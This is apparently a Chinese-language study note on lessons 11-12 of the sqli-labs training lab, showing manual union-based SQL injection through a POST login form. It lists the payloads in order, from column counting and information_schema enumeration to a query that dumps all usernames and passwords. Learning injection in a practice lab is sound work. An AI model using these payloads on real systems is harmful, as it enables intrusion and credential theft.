post_union（less11-12）

2025/12/26 从零开始的sql注入生活 sql_lab

原理：

其实和less1-4的原理没有区别，只是在请求方式上改变（即只是输入和构造代码的地方，less1-4是get请求（向服务端请求数据）less11-12是post请求（向服务端发送数据）。故其他不再赘述。

手工注入过程

判断注入类型

在username栏键入a’

可以看见报错，说明存在sql注入且是字符型。

而且当我们正常登录时，网页会正常回显对应信息，因此可以使用union注入。

判断列数

在username键入

a' or 1=1 order by 2--+

可以判断有两列。

查看回显位置

a' union select 1,2#

1，2位置可以回显

开始union注入

a' union select 1,database()#

得到数据库名security

a' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#

显然我们需要users

a' union select 1,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'#

得到username,password

a' union select group_concat(username),group_concat(password) from security.users#

从而得到用户名和密码
